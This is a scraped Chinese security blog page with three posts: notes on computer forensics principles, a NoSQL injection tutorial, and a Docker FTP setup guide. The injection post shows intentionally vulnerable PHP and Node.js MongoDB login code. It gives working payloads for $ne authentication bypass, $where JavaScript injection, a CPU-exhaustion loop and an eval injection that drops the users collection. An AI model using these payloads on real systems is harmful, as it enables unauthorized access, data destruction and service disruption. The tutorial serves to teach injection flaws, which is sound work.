<li>分析司法鉴定复件</li>
<li>撰写取证分析报告</li>
</ol>
</blockquote>
<h5 id="-取证的原则"><a href="#-取证的原则" class="headerlink" title=" 取证的原则"></a> 取证的原则</h5><blockquote>
<ol>
<li>取证过程中不能对目标设备有任何改动，读取硬盘数据必须用只读锁</li>
<li>所有提取的文件都要经过签名，保证不被篡改1</li>
<li>保证证据的阴干每次使用前都要“洗盘”–清零操作</li>
<li>尽可能有限提取易失性数据–内存、网络数据包等</li>
<li>分析证据的工作应该在工作副本（对目标硬盘逐位、逐字节的镜像）上进行</li>
</ol>
</blockquote>
<h5 id="-计算机取证常用软-硬件工具"><a href="#-计算机取证常用软-硬件工具" class="headerlink" title=" 计算机取证常用软/硬件工具"></a> 计算机取证常用软/硬件工具</h5><p>软件：EnCase、X-way、FTK<br>硬件：硬盘拷贝机、手机信号屏蔽箱、硬<br>件加速器</p>
<p>CELLDEK:便携式手机取证箱</p>
<p>手机信号屏蔽箱</p>
<p>OmniClone 5Xi 硬盘拷贝机</p>
<p><img src="C:\Users\13638\AppData\Roaming\Typora\typora-user-images\1547629836433.png" alt="1547629836433"></p>
<p>EnCase取证分析软件</p>
<p>X-Ways Forensics</p>
<p>FTK 司法分析软件</p>
<p>F-Response在线网络取证工具</p>
<h2 id="操作-13"><a href="#操作-13" class="headerlink" title="操作"></a>操作</h2><h5 id="计算机犯罪取证一般的操作过程及操作原则"><a href="#计算机犯罪取证一般的操作过程及操作原则" class="headerlink" title="计算机犯罪取证一般的操作过程及操作原则"></a>计算机犯罪取证一般的操作过程及操作原则</h5><p><img src="C:\Users\13638\AppData\Roaming\Typora\typora-user-images\1547905771587.png" alt="1547905771587"></p>
<p><img src="C:\Users\13638\AppData\Roaming\Typora\typora-user-images\1547905784209.png" alt="1547905784209"></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://lyuane.github.io/2018/11/09/2018-11-09-NoSQL%E6%B3%A8%E5%85%A5/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpeg">
      <meta itemprop="name" content="沄渊">
      <meta itemprop="description" content="路漫漫其修远兮,吾将上下而求索">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="沄渊">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2018/11/09/2018-11-09-NoSQL%E6%B3%A8%E5%85%A5/" class="post-title-link" itemprop="url">NoSQL注入</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2018-11-09 00:00:00" itemprop="dateCreated datePublished" datetime="2018-11-09T00:00:00+08:00">2018-11-09</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h3 id="0x01-概念"><a href="#0x01-概念" class="headerlink" title="0x01 概念"></a>0x01 概念</h3><p>引自OWASP：NoSQL数据库提供比传统SQL数据库更宽松的一致性限制。 通过减少关系约束和一致性检查，NoSQL数据库提供了更好的性能和扩展性。 然而，即使这些数据库没有使用传统的SQL语法，它们仍然可能很容易的受到注入攻击。 由于这些NoSQL注入攻击可以在程序语言中执行，而不是在声明式 SQL语言中执行，所以潜在影响要大于传统SQL注入。</p>
<h3 id="0x02-NoSQL注入分类"><a href="#0x02-NoSQL注入分类" class="headerlink" title="0x02 NoSQL注入分类"></a>0x02 NoSQL注入分类</h3><p>按语言分类</p>
<blockquote>
<ul>
<li>php数组注入</li>
<li>js注入</li>
<li>Mongo shell拼接注入</li>
</ul>
</blockquote>
<p>按攻击机制分类</p>
<blockquote>
<ul>
<li>重言式(永真式)   ‘ or ‘1’=’1</li>
<li>联合查询   ’ and false union select 1,database()%23</li>
<li>js注入   由允许执行数据内容中JavaScript的NoSQL数据库引入的。JavaScript使在数据引擎进行复杂事务和查询成为可能。传递不干净的用户输入到这些查询中可以注入任意JavaScript代码，这会导致非法的数据获取或篡改</li>
</ul>
</blockquote>
<h3 id="0x03-php中的NoSQL注入"><a href="#0x03-php中的NoSQL注入" class="headerlink" title="0x03 php中的NoSQL注入"></a>0x03 php中的NoSQL注入</h3><h4 id="重言注入"><a href="#重言注入" class="headerlink" title="重言注入"></a>重言注入</h4><p>样例代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$manager</span> = <span class="keyword">new</span> MongoDB\Driver\Manager(<span class="string">&quot;mongodb://mongo:27017&quot;</span>);</span><br><span class="line"><span class="variable">$dbUsername</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="variable">$dbPassword</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="variable">$data</span> = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">&#x27;username&#x27;</span> =&gt; <span class="variable">$_REQUEST</span>[<span class="string">&#x27;username&#x27;</span>],</span><br><span class="line"><span class="string">&#x27;password&#x27;</span> =&gt; <span class="variable">$_REQUEST</span>[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line"></span><br><span class="line">); </span><br><span class="line"><span class="variable">$query</span> = <span class="keyword">new</span> MongoDB\Driver\Query(<span class="variable">$data</span>);</span><br><span class="line"><span class="variable">$cursor</span> = <span class="variable">$manager</span>-&gt;executeQuery(<span class="string">&#x27;test.users&#x27;</span>, <span class="variable">$query</span>)-&gt;toArray();</span><br><span class="line"><span class="variable">$doc_failed</span> = <span class="keyword">new</span> DOMDocument();</span><br><span class="line"><span class="variable">$doc_failed</span>-&gt;loadHTMLFile(<span class="string">&quot;failed.html&quot;</span>);</span><br><span class="line"><span class="variable">$doc_succeed</span> = <span class="keyword">new</span> DOMDocument();</span><br><span class="line"><span class="variable">$doc_succeed</span>-&gt;loadHTMLFile(<span class="string">&quot;succeed.html&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(count(<span class="variable">$cursor</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$doc_succeed</span>-&gt;saveHTML();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$doc_failed</span>-&gt;saveHTML();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>一个简单的登录处理代码</p>
<p>这里没有对用户输入进行校验，因此我们构造一个永真的条件就可以完成NoSQL注入。</p>
<p>这里构造payload需要用到Mongo的$ne </p>
<p>如图是官网对于$ne的解释，大概意思选择不等于$ne的字段值</p>
<p><img src="https://raw.githubusercontent.com/LYuane/LYuane.github.io/master/img/2017-11-09-NoSQL%E6%B3%A8%E5%85%A5/1547470980529.png" alt="1547470980529"></p>
<p>所以我们可以构造payload如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username[<span class="variable">$ne</span>]=<span class="number">1</span>&amp;password[<span class="variable">$ne</span>]=<span class="number">1</span></span><br><span class="line"><span class="comment">/*这句话相当于sql语句中select * from test where username!=&#x27;1&#x27; and password!=&#x27;1&#x27;;*/</span></span><br></pre></td></tr></table></figure>



<p>顺便记录一下mongo的条件操作符</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$gt</span> : &gt;</span><br><span class="line"><span class="variable">$lt</span> : &lt;</span><br><span class="line"><span class="variable">$gte</span>: &gt;=</span><br><span class="line"><span class="variable">$lte</span>: &lt;=</span><br><span class="line"><span class="variable">$ne</span> : !=、&lt;&gt;</span><br><span class="line"><span class="variable">$in</span> : in</span><br><span class="line"><span class="variable">$nin</span>: not in</span><br><span class="line"><span class="variable">$all</span>: all </span><br><span class="line"><span class="variable">$or</span>:<span class="keyword">or</span></span><br><span class="line"><span class="variable">$not</span>: 反匹配(<span class="number">1.3</span>.<span class="number">3</span>及以上版本)</span><br><span class="line">模糊查询用正则式：db.customer.find(&#123;<span class="string">&#x27;name&#x27;</span>: &#123;<span class="string">&#x27;$regex&#x27;</span>:<span class="string">&#x27;.*s.*&#x27;</span>&#125; &#125;)</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">* : 范围查询 &#123; &quot;age&quot; : &#123; &quot;$gte&quot; : 2 , &quot;$lte&quot; : 21&#125;&#125;</span></span><br><span class="line"><span class="comment">* : $ne &#123; &quot;age&quot; : &#123; &quot;$ne&quot; : 23&#125;&#125;</span></span><br><span class="line"><span class="comment">* : $lt &#123; &quot;age&quot; : &#123; &quot;$lt&quot; : 23&#125;&#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">eg：</span></span><br><span class="line"><span class="comment">//查询age = 22的记录</span></span><br><span class="line"><span class="comment">db.userInfo.find(&#123;&quot;age&quot;: 22&#125;);</span></span><br><span class="line"><span class="comment">//相当于：select * from userInfo where age = 22;</span></span><br><span class="line"><span class="comment">//查询age &gt; 22的记录</span></span><br><span class="line"><span class="comment">db.userInfo.find(&#123;age: &#123;$gt: 22&#125;&#125;);</span></span><br><span class="line"><span class="comment">//相当于：select * from userInfo where age &gt; 22;</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h4 id="NoSQL联合查询注入"><a href="#NoSQL联合查询注入" class="headerlink" title="NoSQL联合查询注入"></a>NoSQL联合查询注入</h4><p>NoSQL也有类似问题，但是现在无论是PHP的MongoDB driver还是node.js的mongoose都必须要求查询条件必须是一个数组或者对象了，因此简单看一下就好。</p>
<p>查询语句：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">string</span> query =<span class="string">&quot;&#123; username: &#x27;&quot;</span> + post_username + <span class="string">&quot;&#x27;, password: &#x27;&quot;</span> + post_password + <span class="string">&quot;&#x27; &#125;&quot;</span></span><br></pre></td></tr></table></figure>

<p>payload：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=tolkien<span class="string">&#x27;, $or: [ &#123;&#125;, &#123; &#x27;</span>a<span class="string">&#x27;:&#x27;</span>a&amp;password=<span class="string">&#x27; &#125; ]</span></span><br></pre></td></tr></table></figure>



<h4 id="JS注入"><a href="#JS注入" class="headerlink" title="JS注入"></a>JS注入</h4><p>1.$where操作符</p>
<p>​    在MongoDB中 $where操作符是可以执行JavaScript语句的,在MongoDB 2.4之前，通过$where操作符使用<code>map-reduce</code>、<code>group</code>命令可以访问到mongo shell中的全局函数和属性，如<code>db</code></p>
<p>示例代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$manager</span> = <span class="keyword">new</span> MongoDB\Driver\Manager(<span class="string">&quot;mongodb://mongo:27017&quot;</span>);</span><br><span class="line"><span class="variable">$query_body</span> =<span class="keyword">array</span>(</span><br><span class="line"><span class="string">&#x27;$where&#x27;</span>=&gt;<span class="string">&quot;</span></span><br><span class="line"><span class="string">function q() &#123;</span></span><br><span class="line"><span class="string">var username = &quot;</span>.<span class="variable">$_REQUEST</span>[<span class="string">&quot;username&quot;</span>].<span class="string">&quot;;</span></span><br><span class="line"><span class="string">var password = &quot;</span>.<span class="variable">$_REQUEST</span>[<span class="string">&quot;password&quot;</span>].<span class="string">&quot;;if(username == &#x27;admin&#x27;&amp;&amp;password == &#x27;123456&#x27;) return true; else&#123; return false;&#125;&#125;</span></span><br><span class="line"><span class="string">&quot;</span>); </span><br><span class="line"><span class="variable">$query</span> = <span class="keyword">new</span> MongoDB\Driver\Query(<span class="variable">$query_body</span>);</span><br><span class="line"><span class="variable">$cursor</span> = <span class="variable">$manager</span>-&gt;executeQuery(<span class="string">&#x27;test.users&#x27;</span>, <span class="variable">$query</span>)-&gt;toArray();</span><br><span class="line"><span class="variable">$doc_failed</span> = <span class="keyword">new</span> DOMDocument();</span><br><span class="line"><span class="variable">$doc_failed</span>-&gt;loadHTMLFile(<span class="string">&quot;failed.html&quot;</span>);</span><br><span class="line"><span class="variable">$doc_succeed</span> = <span class="keyword">new</span> DOMDocument();</span><br><span class="line"><span class="variable">$doc_succeed</span>-&gt;loadHTMLFile(<span class="string">&quot;succeed.html&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(count(<span class="variable">$cursor</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$doc_succeed</span>-&gt;saveHTML();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$doc_failed</span>-&gt;saveHTML();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>payload:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=<span class="number">1</span>&amp;password=<span class="number">1</span>;<span class="keyword">return</span> <span class="literal">true</span>;</span><br></pre></td></tr></table></figure>

<p>查看数据流：</p>
<p><img src="https://raw.githubusercontent.com/LYuane/LYuane.github.io/master/img/2017-11-09-NoSQL%E6%B3%A8%E5%85%A5/1547471756855.png" alt="1547471756855"></p>
<p>$where操作符注入的一个骚操作（这个payload可以让MongoDB所在服务器CPU瞬间飙升，持续5秒）</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=<span class="number">1</span>&amp;password=<span class="number">1</span>;(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">var</span>%<span class="number">20</span>date%<span class="number">20</span>=%<span class="number">20</span><span class="keyword">new</span>%<span class="number">20</span>Date();%<span class="number">20</span><span class="keyword">do</span>&#123;curDate%<span class="number">20</span>=%<span class="number">20</span><span class="keyword">new</span>%<span class="number">20</span>Date();&#125;<span class="keyword">while</span>(curDate-date%<span class="number">3</span>C5000);%<span class="number">20</span><span class="keyword">return</span>%<span class="number">20</span>Math.max();&#125;)();</span><br></pre></td></tr></table></figure>



<p>2.command方法注入</p>
<p>MongoDB driver一般都提供直接执行shell命令的方法，这些方式一般是不推荐使用的，但难免有人为了实现一些复杂的查询去使用，在php官网中就已经友情提醒了不要这样使用:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$manager</span> = <span class="keyword">new</span> MongoDB\Driver\Manager(<span class="string">&quot;mongodb://mongo:27017&quot;</span>);</span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$cmd</span> = <span class="keyword">new</span> MongoDB\Driver\Command([</span><br><span class="line"><span class="comment">// build the &#x27;distinct&#x27; command</span></span><br><span class="line"><span class="string">&#x27;eval&#x27;</span>=&gt; <span class="string">&quot;db.users.distinct(&#x27;username&#x27;,&#123;&#x27;username&#x27;:&#x27;<span class="subst">$username</span>&#x27;&#125;)&quot;</span></span><br><span class="line">]);</span><br><span class="line"><span class="variable">$cursor</span> = <span class="variable">$manager</span>-&gt;executeCommand(<span class="string">&#x27;test&#x27;</span>, <span class="variable">$cmd</span>)-&gt;toArray();</span><br><span class="line">var_dump(<span class="variable">$cursor</span>);</span><br><span class="line"><span class="variable">$doc_failed</span> = <span class="keyword">new</span> DOMDocument();</span><br><span class="line"><span class="variable">$doc_failed</span>-&gt;loadHTMLFile(<span class="string">&quot;failed.html&quot;</span>);</span><br><span class="line"><span class="variable">$doc_succeed</span> = <span class="keyword">new</span> DOMDocument();</span><br><span class="line"><span class="variable">$doc_succeed</span>-&gt;loadHTMLFile(<span class="string">&quot;succeed.html&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(count(<span class="variable">$cursor</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$doc_succeed</span>-&gt;saveHTML();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$doc_failed</span>-&gt;saveHTML();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>示例代码直接将传进去的$username参数进行shell执行并输出，如果当前应用连接数据库的权限恰好很高，我们能干的事情更多，例如：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=<span class="number">2</span><span class="string">&#x27;&#125;);db.users.drop();db.user.find(&#123;&#x27;</span>username<span class="string">&#x27;:&#x27;</span><span class="number">2</span> </span><br></pre></td></tr></table></figure>

<p>删库跑路了解一下</p>
<h3 id="0x04-Node-js中的NoSQL注入"><a href="#0x04-Node-js中的NoSQL注入" class="headerlink" title="0x04 Node.js中的NoSQL注入"></a>0x04 Node.js中的NoSQL注入</h3><p>示例代码：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> mongoose = <span class="built_in">require</span>(<span class="string">&#x27;mongoose&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> bodyParser = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>);</span><br><span class="line">mongoose.connect(<span class="string">&#x27;mongodb://localhost/test&#x27;</span>, &#123; <span class="attr">useMongoClient</span>: <span class="literal">true</span> &#125;);</span><br><span class="line"><span class="keyword">var</span> UserSchema = <span class="keyword">new</span> mongoose.Schema(&#123;</span><br><span class="line"><span class="attr">name</span>: <span class="built_in">String</span>,</span><br><span class="line"><span class="attr">username</span>: <span class="built_in">String</span>,</span><br><span class="line"><span class="attr">password</span>: <span class="built_in">String</span></span><br><span class="line">&#125;);</span><br><span class="line"><span class="keyword">var</span> User = mongoose.model(<span class="string">&#x27;users&#x27;</span>, UserSchema);</span><br><span class="line"><span class="keyword">var</span> app = express();</span><br><span class="line">app.set(<span class="string">&#x27;views&#x27;</span>, __dirname);</span><br><span class="line">app.set(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;jade&#x27;</span>);</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">&#x27;/&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">res.render(<span class="string">&#x27;index&#x27;</span>, &#123;&#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.use(bodyParser.json()); </span><br><span class="line"></span><br><span class="line">app.post(<span class="string">&#x27;/&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(req.body)</span><br><span class="line">User.findOne(&#123;<span class="attr">username</span>: req.body.username, <span class="attr">password</span>: req.body.password&#125;, <span class="function"><span class="keyword">function</span>(<span class="params">err, user</span>) </span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(user)</span><br><span class="line"><span class="keyword">if</span> (err) &#123;</span><br><span class="line"><span class="keyword">return</span> res.render(<span class="string">&#x27;index&#x27;</span>, &#123;<span class="attr">message</span>: err.message&#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!user) &#123;</span><br><span class="line"><span class="keyword">return</span> res.render(<span class="string">&#x27;index&#x27;</span>, &#123;<span class="attr">message</span>: <span class="string">&#x27;Sorry!&#x27;</span>&#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> res.render(<span class="string">&#x27;index&#x27;</span>, &#123;<span class="attr">message</span>: <span class="string">&#x27;Welcome back &#x27;</span> + user.name + <span class="string">&#x27;!!!&#x27;</span>&#125;);</span><br><span class="line">&#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> server = app.listen(<span class="number">49090</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;listening on port %d&#x27;</span>, server.address().port);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>payload:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST http:<span class="comment">//127.0.0.1:49090/ HTTP/1.1</span></span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"><span class="string">&quot;username&quot;</span>: &#123;<span class="string">&quot;$ne&quot;</span>: <span class="literal">null</span>&#125;,</span><br><span class="line"><span class="string">&quot;password&quot;</span>: &#123;<span class="string">&quot;$ne&quot;</span>: <span class="literal">null</span>&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="0x05-NoSQLAttack"><a href="#0x05-NoSQLAttack" class="headerlink" title="0x05 NoSQLAttack"></a>0x05 NoSQLAttack</h3><p>NoSQLAttack 是一个用python编写的开源的攻击工具，用来暴露网络中默认配置mongoDB的IP并且下载目标mongoDB的数据，同时还可以针对以mongoDB为后台存储的应用进行注入攻击，使用这个工具就可以发现有成千上万的mongoDB裸奔在互联网上，并且数据可以随意下载。</p>
<h3 id="0x06-Referer"><a href="#0x06-Referer" class="headerlink" title="0x06 Referer"></a>0x06 Referer</h3>
      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://lyuane.github.io/2018/10/23/2018-10-23-%E5%88%A9%E7%94%A8docker%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BAFTP%E6%9C%8D%E5%8A%A1%E5%99%A8/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpeg">
      <meta itemprop="name" content="沄渊">
      <meta itemprop="description" content="路漫漫其修远兮,吾将上下而求索">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="沄渊">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2018/10/23/2018-10-23-%E5%88%A9%E7%94%A8docker%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BAFTP%E6%9C%8D%E5%8A%A1%E5%99%A8/" class="post-title-link" itemprop="url">利用docker快速搭建FTP服务器</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2018-10-23 00:00:00" itemprop="dateCreated datePublished" datetime="2018-10-23T00:00:00+08:00">2018-10-23</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h3 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h3><p>docker压缩包已上传至github</p>
<h3 id="0x01-导入镜像"><a href="#0x01-导入镜像" class="headerlink" title="0x01 导入镜像"></a>0x01 导入镜像</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat ftp.rar | docker import - ftp:tyz      //[REPOSITORY]:[tag]</span><br></pre></td></tr></table></figure>



<h3 id="0x02-启动容器"><a href="#0x02-启动容器" class="headerlink" title="0x02 启动容器"></a>0x02 启动容器</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">docker run -dt --name ftp -e &quot;PUBLICHOST=localhost&quot; --privileged=true -v /home/ftpusers/robin:/home/ftpusers/www ftp:tyz bash</span><br><span class="line"></span><br><span class="line">说明：</span><br><span class="line"></span><br><span class="line">　　使用绑定IP为192.168.0.3，如果是公开FTP的话，可以不写IP。</span><br><span class="line"></span><br><span class="line">　　FTP用户计算方式为“(最大端口号-最小端口号) / 2”。我这里修改为可以满足100个用户同时连接登陆</span><br><span class="line"></span><br><span class="line">　　做了个目录映射，把本机的/home/ftpusers/robin目录映射到pure-ftp的/home/ftpusers/www下</span><br></pre></td></tr></table></figure>

<h3 id="0x03-运行FTP"><a href="#0x03-运行FTP" class="headerlink" title="0x03 运行FTP"></a>0x03 运行FTP</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.进入docker容器</span><br><span class="line">docker exec -it ftp bin/bash</span><br><span class="line"></span><br><span class="line">2.在容器内执行命令</span><br><span class="line">/usr/sbin/pure-ftpd -c 100 -C 100 -l puredb:/etc/pure-ftpd/pureftpd.pdb -E -j -R -P $PUBLICHOST -p 30000:30209 &amp;</span><br></pre></td></tr></table></figure>

<h3 id="0x04-测试"><a href="#0x04-测试" class="headerlink" title="0x04 测试"></a>0x04 测试</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ftp -p [IP] [port]</span><br><span class="line">如果没变的话应该是   ftp -p 192.168.0.3 21</span><br><span class="line"></span><br><span class="line">预设两个用户名/密码     www/www     test/test</span><br></pre></td></tr></table></figure>

<h3 id="0x05-从dockerhub拉取"><a href="#0x05-从dockerhub拉取" class="headerlink" title="0x05 从dockerhub拉取"></a>0x05 从dockerhub拉取</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker pull stilliard/pure-ftpd:hardened</span><br><span class="line"></span><br><span class="line">docker run -d --name ftp1 -p 2121:21 -p 30000-30009:30000-30009 -e FTP_USER_NAME=test -e FTP_USER_PASS=test -e FTP_USER_HOME=/home/test stilliard/pure-ftpd:hardened</span><br></pre></td></tr></table></figure>



<p>测试</p>
